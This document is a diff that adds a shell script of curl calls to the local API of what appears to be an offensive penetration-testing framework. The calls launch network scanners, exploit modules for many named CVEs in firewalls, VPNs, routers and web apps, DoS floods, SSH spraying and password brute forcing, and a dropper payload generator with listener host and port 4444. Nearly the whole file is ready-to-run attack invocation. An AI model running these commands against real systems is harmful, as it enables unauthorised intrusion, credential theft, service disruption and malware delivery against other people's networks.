+# ─── 26. Ping Sweep ─────────────────────────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/ping_sweep",
+    "target": "192.168.1.0/24",
+    "prompts": {
+      "add_manual_targets": "n",
+      "load_from_file": "n",
+      "timeout": "3",
+      "concurrency": "100",
+      "verbose": "n",
+      "save_up_hosts": "y",
+      "up_hosts_file": "ping_sweep_up_hosts.txt",
+      "save_down_hosts": "n",
+      "use_icmp": "y",
+      "use_tcp": "n",
+      "use_syn": "n",
+      "use_ack": "n"
+    }
+  }' | python3 -m json.tool
+
+# ─── 27. Directory Brute Force ──────────────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/dir_brute",
+    "target": "192.168.1.1",
+    "prompts": {
+      "mode": "1",
+      "target": "192.168.1.1",
+      "use_https": "y",
+      "port": "443",
+      "base_path": "/",
+      "wordlist": "/usr/share/wordlists/dirb/common.txt",
+      "save_results": "y",
+      "sort_by": "1"
+    }
+  }' | python3 -m json.tool
+
+# ─── 28. Sequential Fuzzer ──────────────────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/sequential_fuzzer",
+    "target": "http://192.168.1.1/",
+    "prompts": {
+      "mode": "1",
+      "min_length": "1",
+      "max_length": "3",
+      "verbose": "n"
+    }
+  }' | python3 -m json.tool
+
+# ─── 29. API Endpoint Scanner ───────────────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/api_endpoint_scanner",
+    "target": "https://192.168.1.1",
+    "prompts": {
+      "output_dir": "api_scan_results",
+      "use_spoofing": "n",
+      "use_generic_payload": "y",
+      "enable_delete": "n",
+      "enable_extended_methods": "n",
+      "modules": "1",
+      "concurrency": "10",
+      "timeout": "10",
+      "endpoint_source": "1",
+      "endpoint_file": "/tmp/endpoints.txt"
+    }
+  }' | python3 -m json.tool
+
+# ─── 30. IPMI Enum/Exploit ──────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/ipmi_enum_exploit",
+    "target": "192.168.1.1",
+    "prompts": {
+      "mode": "1",
+      "target": "192.168.1.1",
+      "port": "623",
+      "test_cipher_zero": "y",
+      "test_anonymous": "y",
+      "test_default_creds": "y",
+      "test_rakp_hash": "y",
+      "concurrency": "1",
+      "output_file": "ipmi_scan_results.csv"
+    }
+  }' | python3 -m json.tool
+
+# ─── 31. SSDP MSearch Scanner ───────────────────────────────────
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/ssdp_msearch",
+    "target": "192.168.1.1",
+    "prompts": {
+      "port": "1900",
+      "timeout": "5",
+      "retries": "2",
+      "verbose": "y",
+      "save_results": "y",
+      "search_target": "ssdp:all"
+    }
+  }' | python3 -m json.tool
+
+# ─── 32. Sample Scanner ────────────────────────────────────────
+curl -s --max-time 30 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/sample_scanner",
+    "target": "192.168.1.1",
+    "prompts": {
+      "timeout": "5",
+      "check_http": "y",
+      "check_https": "y",
+      "verbose": "n",
+      "save_results": "y",
+      "output_file": "sample_scan.txt"
+    }
+  }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# DOMAIN TARGETING — NEW
+# Target domains by name, resolved IP, or with custom protocol/port
+# ═══════════════════════════════════════════════════════════════
+
+# ─── Set Domain Target ────────────────────────────────────────
+# In interactive shell, setting a domain triggers protocol/port prompts:
+#   rsf> t example.com
+#   [*] Domain target detected: example.com
+#   [+] Resolved to: 93.184.216.34
+#   Select protocol:
+#     1) https (default)
+#     2) http
+#     3) https with custom port
+#     4) http with custom port
+#     5) Use resolved IP directly (no protocol)
+
+# API: Set domain target directly
+curl -s -X POST http://127.0.0.1:8080/api/target \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{"target": "example.com"}' | python3 -m json.tool
+
+# API: Set domain with custom port
+curl -s -X POST http://127.0.0.1:8080/api/target \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{"target": "example.com:8443"}' | python3 -m json.tool
+
+# API: Run scanner against domain target
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "scanners/port_scanner",
+    "target": "example.com",
+    "prompts": {
+      "port_range": "1-1000",
+      "timeout": "3",
+      "concurrency": "100"
+    }
+  }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# EXPLOIT MODULES — Router/Network/Framework/WebApp
+# ═══════════════════════════════════════════════════════════════
+
+# ─── 33. SSH PWN Session ─────────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/ssh/sshpwn_session",
+    "target": "192.168.1.1",
+    "prompts": { "port": "22", "username": "root", "password": "toor", "mode": "2" }
+  }' | python3 -m json.tool
+
+# ─── 34. SSH PWN SFTP Attacks ────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/ssh/sshpwn_sftp_attacks",
+    "target": "192.168.1.1",
+    "prompts": { "port": "22", "username": "root", "password": "toor", "mode": "1" }
+  }' | python3 -m json.tool
+
+# ─── 35. SSH PWN SCP Attacks ─────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/ssh/sshpwn_scp_attacks",
+    "target": "192.168.1.1",
+    "prompts": { "port": "22", "username": "root", "password": "toor", "mode": "1" }
+  }' | python3 -m json.tool
+
+# ─── 36. SSH PWN Auth Password ───────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/ssh/sshpwn_auth_passwd",
+    "target": "192.168.1.1",
+    "prompts": { "port": "22", "mode": "1" }
+  }' | python3 -m json.tool
+
+# ─── 37. SSH PWN PAM ────────────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/ssh/sshpwn_pam",
+    "target": "192.168.1.1",
+    "prompts": { "port": "22", "username": "root", "password": "toor" }
+  }' | python3 -m json.tool
+
+# ─── 38. OpenSSH 9.8p1 Race Condition ───────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/ssh/opensshserver_9_8p1race_condition",
+    "target": "192.168.1.1",
+    "prompts": { "port": "22" }
+  }' | python3 -m json.tool
+
+# ─── 39. Apache Tomcat CVE-2025-24813 RCE ───────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/frameworks/apache_tomcat/cve_2025_24813_apache_tomcat_rce",
+    "target": "192.168.1.1",
+    "prompts": { "port": "8080" }
+  }' | python3 -m json.tool
+
+# ─── 40. Apache Tomcat CatKiller CVE-2025-31650 ─────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/frameworks/apache_tomcat/catkiller_cve_2025_31650",
+    "target": "192.168.1.1",
+    "prompts": { "port": "8443" }
+  }' | python3 -m json.tool
+
+# ─── 41. FortiOS Auth Bypass CVE-2022-40684 ─────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/fortinet/fortios_auth_bypass_cve_2022_40684",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 42. FortiOS SSL VPN CVE-2018-13379 ─────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/fortinet/fortios_ssl_vpn_cve_2018_13379",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 43. FortiWeb RCE CVE-2021-22123 ────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/fortinet/fortiweb_rce_cve_2021_22123",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 44. FortiWeb SQLi RCE CVE-2025-25257 ───────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/fortinet/fortiweb_sqli_rce_cve_2025_25257",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 45. FortiSIEM RCE CVE-2025-64155 ───────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/fortinet/fortisiem_rce_cve_2025_64155",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 46. FortiCloud SSO Auth Bypass CVE-2026-24858 ──────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/fortinet/forticloud_sso_auth_bypass_cve_2026_24858",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 47. Ivanti Connect Secure Buffer Overflow ──────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/ivanti/ivanti_connect_secure_stack_based_buffer_overflow",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 48. Ivanti EPMM CVE-2023-35082 ────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/ivanti/ivanti_epmm_cve_2023_35082",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 49. vCenter Backup RCE ─────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/vmware/vcenter_backup_rce",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 50. vCenter File Read ──────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/vmware/vcenter_file_read",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 51. ESXi VM Escape Check ───────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/vmware/esxi_vm_escape_check",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 52. Trend Micro CVE-2025-5777 ──────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/trend_micro/cve_2025_5777",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 53. QNAP QTS RCE CVE-2024-27130 ───────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/network_infra/qnap/qnap_qts_rce_cve_2024_27130",
+    "target": "192.168.1.1",
+    "prompts": { "port": "8080" }
+  }' | python3 -m json.tool
+
+# ─── 54. PAN-OS Auth Bypass CVE-2025-0108 ───────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/routers/palo_alto/panos_authbypass_cve_2025_0108",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 55. TP-Link WR740N DoS ─────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/routers/tplink/tplink_wr740n_dos",
+    "target": "192.168.0.1",
+    "prompts": { "port": "8082", "username": "admin", "password": "admin" }
+  }' | python3 -m json.tool
+
+# ─── 56. TP-Link Archer RCE CVE-2024-53375 ──────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/routers/tplink/tplink_archer_rce_cve_2024_53375",
+    "target": "192.168.0.1",
+    "prompts": { "port": "80" }
+  }' | python3 -m json.tool
+
+# ─── 57. D-Link DCS-930L Auth Bypass ────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/routers/dlink/dlink_dcs_930l_auth_bypass",
+    "target": "192.168.0.1",
+    "prompts": { "port": "80" }
+  }' | python3 -m json.tool
+
+# ─── 58. Ruijie Auth Bypass RCE CVE-2023-34644 ──────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/routers/ruijie/ruijie_auth_bypass_rce_cve_2023_34644",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 59. Zyxel CPE CI CVE-2024-40890 ───────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/routers/zyxel/zyxel_cpe_ci_cve_2024_40890",
+    "target": "192.168.1.1",
+    "prompts": { "port": "80" }
+  }' | python3 -m json.tool
+
+# ─── 60. Jenkins 2.441 LFI ──────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/frameworks/jenkins/jenkins_2_441_lfi",
+    "target": "192.168.1.1",
+    "prompts": { "port": "8080" }
+  }' | python3 -m json.tool
+
+# ─── 61. HTTP/2 Rapid Reset CVE-2023-44487 ──────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/frameworks/http2/cve_2023_44487_http2_rapid_reset",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 62. PHP CGI CVE-2024-4577 ──────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/frameworks/php/cve_2024_4577",
+    "target": "192.168.1.1",
+    "prompts": { "port": "80" }
+  }' | python3 -m json.tool
+
+# ─── 63. Nginx PWNer ────────────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/frameworks/nginx/nginx_pwner",
+    "target": "192.168.1.1",
+    "prompts": { "port": "80" }
+  }' | python3 -m json.tool
+
+# ─── 64. Exim ETRN SQLi CVE-2025-26794 ─────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/frameworks/exim/exim_etrn_sqli_cve_2025_26794",
+    "target": "192.168.1.1",
+    "prompts": { "port": "25" }
+  }' | python3 -m json.tool
+
+# ─── 65. MongoBleed ─────────────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/frameworks/mongo/mongobleed",
+    "target": "192.168.1.1",
+    "prompts": { "port": "27017" }
+  }' | python3 -m json.tool
+
+# ─── 66. SharePoint CVE-2024-38094 ──────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/webapps/sharepoint/cve_2024_38094",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 67. Roundcube PostAuth RCE ─────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/webapps/roundcube/roundcube_postauth_rce",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 68. WordPress VitePOS CVE-2025-13156 ───────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/webapps/wordpress/vitepos_file_upload_cve_2025_13156",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 69. Flowise RCE CVE-2025-59528 ────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/webapps/flowise/cve_2025_59528_flowise_rce",
+    "target": "192.168.1.1",
+    "prompts": { "port": "3000" }
+  }' | python3 -m json.tool
+
+# ─── 70. Zabbix 7.0.0 SQL Injection ────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/webapps/zabbix/zabbix_7_0_0_sql_injection",
+    "target": "192.168.1.1",
+    "prompts": { "port": "80" }
+  }' | python3 -m json.tool
+
+# ─── 71. n8n RCE CVE-2025-68613 ────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/webapps/n8n/n8n_rce_cve_2025_68613",
+    "target": "192.168.1.1",
+    "prompts": { "port": "5678" }
+  }' | python3 -m json.tool
+
+# ─── 72. React2Shell ────────────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/webapps/react/react2shell",
+    "target": "192.168.1.1",
+    "prompts": { "port": "3000" }
+  }' | python3 -m json.tool
+
+# ─── 73. DoS - Null SYN Exhaustion ──────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/dos/null_syn_exhaustion",
+    "target": "192.168.1.1",
+    "prompts": { "port": "80" }
+  }' | python3 -m json.tool
+
+# ─── 74. DoS - TCP Connection Flood ─────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/dos/tcp_connection_flood",
+    "target": "192.168.1.1",
+    "prompts": { "port": "80" }
+  }' | python3 -m json.tool
+
+# ─── 75. DoS - Connection Exhaustion Flood ──────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/dos/connection_exhaustion_flood",
+    "target": "192.168.1.1",
+    "prompts": { "port": "80" }
+  }' | python3 -m json.tool
+
+# ─── 76. FTP Pachev Path Traversal ──────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/ftp/pachev_ftp_path_traversal_1_0",
+    "target": "192.168.1.1",
+    "prompts": { "port": "21" }
+  }' | python3 -m json.tool
+
+# ─── 77. FTP Bounce Test ────────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/ftp/ftp_bounce_test",
+    "target": "192.168.1.1",
+    "prompts": { "port": "21" }
+  }' | python3 -m json.tool
+
+# ─── 78. Heartbleed ─────────────────────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/crypto/heartbleed",
+    "target": "192.168.1.1",
+    "prompts": { "port": "443" }
+  }' | python3 -m json.tool
+
+# ─── 79. Telnet Auth Bypass CVE-2026-24061 ──────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/telnet/telnet_auth_bypass_cve_2026_24061",
+    "target": "192.168.1.1",
+    "prompts": { "port": "23" }
+  }' | python3 -m json.tool
+
+# ─── 80. Payload Generators ─────────────────────────────────────
+# narutto_dropper, batgen, lnkgen, payload_encoder, polymorph_dropper
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/payloadgens/narutto_dropper",
+    "target": "10.0.0.5",
+    "prompts": { "lhost": "10.0.0.5", "lport": "4444" }
+  }' | python3 -m json.tool
+
+# ─── 81. SSH User Enum ──────────────────────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/ssh_user_enum",
+    "target": "192.168.1.1",
+    "prompts": { "port": "22", "username_wordlist": "/usr/share/wordlists/usernames.txt" }
+  }' | python3 -m json.tool
+
+# ─── 82. SSH Spray ──────────────────────────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/ssh_spray",
+    "target": "192.168.1.0/24",
+    "prompts": { "port": "22", "username": "admin", "password": "admin", "concurrency": "20" }
+  }' | python3 -m json.tool
+
+# ─── 83. Telnet Hose ────────────────────────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/telnet_hose",
+    "target": "192.168.1.1",
+    "prompts": { "port": "23" }
+  }' | python3 -m json.tool
+
+# ─── 84. Enable Bruteforce ──────────────────────────────────────
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/generic/enablebruteforce",
+    "target": "192.168.1.1",
+    "prompts": { "port": "23", "password_wordlist": "/usr/share/wordlists/rockyou.txt" }
+  }' | python3 -m json.tool
+
+# ─── 85. ACTi Camera Default Creds ──────────────────────────────
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "creds/camera/acti/acti_camera_default",
+    "target": "192.168.1.1",
+    "prompts": { "port": "80" }
+  }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# UTILITY COMMANDS
+# ═══════════════════════════════════════════════════════════════
+
+# Clear target
+curl -s -X DELETE http://127.0.0.1:8080/api/target \
+  -H 'Authorization: Bearer testkey123' | python3 -m json.tool
+
+# Honeypot check
+curl -s -X POST http://127.0.0.1:8080/api/honeypot-check \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{"target": "192.168.1.1"}' | python3 -m json.tool
+
+# Shell command (single)
+curl -s -X POST http://127.0.0.1:8080/api/shell \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{"command": "modules"}' | python3 -m json.tool
+
+# Shell commands (chained)
+curl -s -X POST http://127.0.0.1:8080/api/shell \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{"commands": ["t 192.168.1.1", "use scanners/port_scanner", "run"]}' \
+  | python3 -m json.tool
